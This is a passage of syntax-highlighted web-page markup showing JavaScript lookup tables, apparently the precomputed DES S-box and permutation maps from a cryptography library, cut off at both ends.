class="number">134217728</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">150994944</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">167772160</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">184549376</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">201326592</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">218103808</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">234881024</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">251658240</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">8388608</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">25165824</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">41943040</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">58720256</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">75497472</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">92274688</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">109051904</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">125829120</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">142606336</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">159383552</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">176160768</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">192937984</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">209715200</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">226492416</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">243269632</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">260046848</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">268435456</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">285212672</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">301989888</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">318767104</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">335544320</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">352321536</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">369098752</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">385875968</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">402653184</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">419430400</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">436207616</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">452984832</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">469762048</span>: <span class="number">540672</span>,</span><br><span class="line">        <span class="number">486539264</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">503316480</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">520093696</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">276824064</span>: <span class="number">540688</span>,</span><br><span class="line">        <span class="number">293601280</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">310378496</span>: <span class="number">1074266112</span>,</span><br><span class="line">        <span class="number">327155712</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">343932928</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">360710144</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">377487360</span>: <span class="number">16</span>,</span><br><span class="line">        <span class="number">394264576</span>: <span class="number">1073741824</span>,</span><br><span class="line">        <span class="number">411041792</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">427819008</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">444596224</span>: <span class="number">1073758224</span>,</span><br><span class="line">        <span class="number">461373440</span>: <span class="number">524304</span>,</span><br><span class="line">        <span class="number">478150656</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">494927872</span>: <span class="number">16400</span>,</span><br><span class="line">        <span class="number">511705088</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">528482304</span>: <span class="number">540672</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">1048576</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2097152</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">3145728</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">4194304</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">5242880</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">6291456</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">7340032</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">8388608</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">9437184</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">10485760</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">11534336</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">12582912</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">13631488</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">14680064</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">15728640</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">524288</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">1572864</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">2621440</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3670016</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">4718592</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">5767168</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">6815744</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">7864320</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">8912896</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">9961472</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">11010048</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">12058624</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">13107200</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">14155776</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">15204352</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">16252928</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">16777216</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">17825792</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">18874368</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">19922944</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">20971520</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">22020096</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">23068672</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">24117248</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">25165824</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">26214400</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">27262976</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">28311552</span>: <span class="number">65792</span>,</span><br><span class="line">        <span class="number">29360128</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">30408704</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">31457280</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">32505856</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">17301504</span>: <span class="number">67108864</span>,</span><br><span class="line">        <span class="number">18350080</span>: <span class="number">260</span>,</span><br><span class="line">        <span class="number">19398656</span>: <span class="number">67174656</span>,</span><br><span class="line">        <span class="number">20447232</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">21495808</span>: <span class="number">65540</span>,</span><br><span class="line">        <span class="number">22544384</span>: <span class="number">67109120</span>,</span><br><span class="line">        <span class="number">23592960</span>: <span class="number">256</span>,</span><br><span class="line">        <span class="number">24641536</span>: <span class="number">67174404</span>,</span><br><span class="line">        <span class="number">25690112</span>: <span class="number">65536</span>,</span><br><span class="line">        <span class="number">26738688</span>: <span class="number">67174660</span>,</span><br><span class="line">        <span class="number">27787264</span>: <span class="number">65796</span>,</span><br><span class="line">        <span class="number">28835840</span>: <span class="number">67108868</span>,</span><br><span class="line">        <span class="number">29884416</span>: <span class="number">67109124</span>,</span><br><span class="line">        <span class="number">30932992</span>: <span class="number">67174400</span>,</span><br><span class="line">        <span class="number">31981568</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="number">33030144</span>: <span class="number">65792</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">65536</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">131072</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">196608</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">262144</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">327680</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">393216</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">458752</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">524288</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">589824</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">655360</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">720896</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">786432</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">851968</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">917504</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">983040</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">32768</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">98304</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">163840</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">229376</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">294912</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">360448</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">425984</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">491520</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">557056</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">622592</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">688128</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">753664</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">819200</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">884736</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">950272</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">1015808</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1048576</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">1114112</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">1179648</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1245184</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">1310720</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">1376256</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">1441792</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">1507328</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">1572864</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">1638400</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">1703936</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">1769472</span>: <span class="number">4198464</span>,</span><br><span class="line">        <span class="number">1835008</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">1900544</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">1966080</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">2031616</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">1081344</span>: <span class="number">2151677952</span>,</span><br><span class="line">        <span class="number">1146880</span>: <span class="number">2151682112</span>,</span><br><span class="line">        <span class="number">1212416</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">1277952</span>: <span class="number">4198400</span>,</span><br><span class="line">        <span class="number">1343488</span>: <span class="number">4194368</span>,</span><br><span class="line">        <span class="number">1409024</span>: <span class="number">2147483648</span>,</span><br><span class="line">        <span class="number">1474560</span>: <span class="number">2147487808</span>,</span><br><span class="line">        <span class="number">1540096</span>: <span class="number">64</span>,</span><br><span class="line">        <span class="number">1605632</span>: <span class="number">2147483712</span>,</span><br><span class="line">        <span class="number">1671168</span>: <span class="number">4096</span>,</span><br><span class="line">        <span class="number">1736704</span>: <span class="number">2147487744</span>,</span><br><span class="line">        <span class="number">1802240</span>: <span class="number">2151678016</span>,</span><br><span class="line">        <span class="number">1867776</span>: <span class="number">4160</span>,</span><br><span class="line">        <span class="number">1933312</span>: <span class="number">2151682048</span>,</span><br><span class="line">        <span class="number">1998848</span>: <span class="number">4194304</span>,</span><br><span class="line">        <span class="number">2064384</span>: <span class="number">4198464</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">4096</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">8192</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">12288</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">16384</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">20480</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">24576</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">28672</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">32768</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">36864</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">40960</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">45056</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">49152</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">53248</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">57344</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">61440</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">2048</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">6144</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">10240</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">14336</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">18432</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">22528</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">26624</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">30720</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">34816</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">38912</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">43008</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">47104</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">51200</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">55296</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">59392</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">63488</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">65536</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">69632</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">73728</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">77824</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">81920</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">86016</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">90112</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">94208</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">98304</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">102400</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">106496</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">110592</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">114688</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">118784</span>: <span class="number">536871040</span>,</span><br><span class="line">        <span class="number">122880</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">126976</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">67584</span>: <span class="number">553648256</span>,</span><br><span class="line">        <span class="number">71680</span>: <span class="number">16777216</span>,</span><br><span class="line">        <span class="number">75776</span>: <span class="number">17039360</span>,</span><br><span class="line">        <span class="number">79872</span>: <span class="number">537133184</span>,</span><br><span class="line">        <span class="number">83968</span>: <span class="number">536870912</span>,</span><br><span class="line">        <span class="number">88064</span>: <span class="number">17039488</span>,</span><br><span class="line">        <span class="number">92160</span>: <span class="number">128</span>,</span><br><span class="line">        <span class="number">96256</span>: <span class="number">553910272</span>,</span><br><span class="line">        <span class="number">100352</span>: <span class="number">262272</span>,</span><br><span class="line">        <span class="number">104448</span>: <span class="number">553910400</span>,</span><br><span class="line">        <span class="number">108544</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">112640</span>: <span class="number">553648128</span>,</span><br><span class="line">        <span class="number">116736</span>: <span class="number">16777344</span>,</span><br><span class="line">        <span class="number">120832</span>: <span class="number">262144</span>,</span><br><span class="line">        <span class="number">124928</span>: <span class="number">537133056</span>,</span><br><span class="line">        <span class="number">129024</span>: <span class="number">536871040</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">256</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">512</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">768</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">1024</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">1280</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">1536</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">1792</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">2048</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2304</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">2560</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">2816</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">3072</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">3328</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">3584</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">3840</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">128</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">384</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">640</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">896</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">1152</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">1408</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">1664</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">1920</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">2176</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">2432</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">2688</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">2944</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">3200</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3456</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">3712</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">3968</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">4096</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">4352</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">4608</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">4864</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">5120</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">5376</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">5632</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">5888</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">6144</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">6400</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">6656</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">6912</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">7168</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">7424</span>: <span class="number">268443656</span>,</span><br><span class="line">        <span class="number">7680</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">7936</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">4224</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="number">4480</span>: <span class="number">2105344</span>,</span><br><span class="line">        <span class="number">4736</span>: <span class="number">2097152</span>,</span><br><span class="line">        <span class="number">4992</span>: <span class="number">268435464</span>,</span><br><span class="line">        <span class="number">5248</span>: <span class="number">268443648</span>,</span><br><span class="line">        <span class="number">5504</span>: <span class="number">8200</span>,</span><br><span class="line">        <span class="number">5760</span>: <span class="number">270540808</span>,</span><br><span class="line">        <span class="number">6016</span>: <span class="number">270532608</span>,</span><br><span class="line">        <span class="number">6272</span>: <span class="number">270540800</span>,</span><br><span class="line">        <span class="number">6528</span>: <span class="number">270532616</span>,</span><br><span class="line">        <span class="number">6784</span>: <span class="number">8192</span>,</span><br><span class="line">        <span class="number">7040</span>: <span class="number">2105352</span>,</span><br><span class="line">        <span class="number">7296</span>: <span class="number">2097160</span>,</span><br><span class="line">        <span class="number">7552</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">7808</span>: <span class="number">268435456</span>,</span><br><span class="line">        <span class="number">8064</span>: <span class="number">268443656</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">16</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">32</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">48</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">64</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">80</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">96</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">112</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">128</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">144</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">160</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">176</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">192</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">208</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">224</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">240</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">8</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">24</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">40</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">56</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">72</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">88</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">104</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">120</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">136</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">152</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">168</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">184</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">200</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">216</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">232</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">248</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">256</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">272</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">288</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">304</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">320</span>: <span class="number">1048577</span>,</span><br><span class="line">        <span class="number">336</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">352</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">368</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">384</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">400</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">416</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">432</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">448</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">464</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">480</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">496</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">264</span>: <span class="number">1049600</span>,</span><br><span class="line">        <span class="number">280</span>: <span class="number">33555457</span>,</span><br><span class="line">        <span class="number">296</span>: <span class="number">34603009</span>,</span><br><span class="line">        <span class="number">312</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="number">328</span>: <span class="number">33554432</span>,</span><br><span class="line">        <span class="number">344</span>: <span class="number">1048576</span>,</span><br><span class="line">        <span class="number">360</span>: <span class="number">1025</span>,</span><br><span class="line">        <span class="number">376</span>: <span class="number">34604032</span>,</span><br><span class="line">        <span class="number">392</span>: <span class="number">33554433</span>,</span><br><span class="line">        <span class="number">408</span>: <span class="number">34603008</span>,</span><br><span class="line">        <span class="number">424</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">440</span>: <span class="number">34604033</span>,</span><br><span class="line">        <span class="number">456</span>: <span class="number">1049601</span>,</span><br><span class="line">        <span class="number">472</span>: <span class="number">1024</span>,</span><br><span class="line">        <span class="number">488</span>: <span class="number">33555456</span>,</span><br><span class="line">        <span class="number">504</span>: <span class="number">1048577</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">2</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">3</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">4</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">5</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">6</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">7</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">8</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">9</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">10</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">11</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">12</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">13</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">14</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">15</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483648</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">2147483649</span>: <span class="number">134350880</span>,</span><br><span class="line">        <span class="number">2147483650</span>: <span class="number">134219808</span>,</span><br><span class="line">        <span class="number">2147483651</span>: <span class="number">134217728</span>,</span><br><span class="line">        <span class="number">2147483652</span>: <span class="number">134348800</span>,</span><br><span class="line">        <span class="number">2147483653</span>: <span class="number">133120</span>,</span><br><span class="line">        <span class="number">2147483654</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">2147483655</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">2147483656</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">2147483657</span>: <span class="number">2080</span>,</span><br><span class="line">        <span class="number">2147483658</span>: <span class="number">131104</span>,</span><br><span class="line">        <span class="number">2147483659</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">2147483660</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">2147483661</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">2147483662</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">2147483663</span>: <span class="number">131072</span>,</span><br><span class="line">        <span class="number">16</span>: <span class="number">133152</span>,</span><br><span class="line">        <span class="number">17</span>: <span class="number">134350848</span>,</span><br><span class="line">        <span class="number">18</span>: <span class="number">32</span>,</span><br><span class="line">        <span class="number">19</span>: <span class="number">2048</span>,</span><br><span class="line">        <span class="number">20</span>: <span class="number">134219776</span>,</span><br><span class="line">        <span class="number">21</span>: <span class="number">134217760</span>,</span><br><span class="line">        <span class="number">22</span>: <span class="number">134348832</span>,</span><br><span class="line">        <span class="number">23</span>: <span 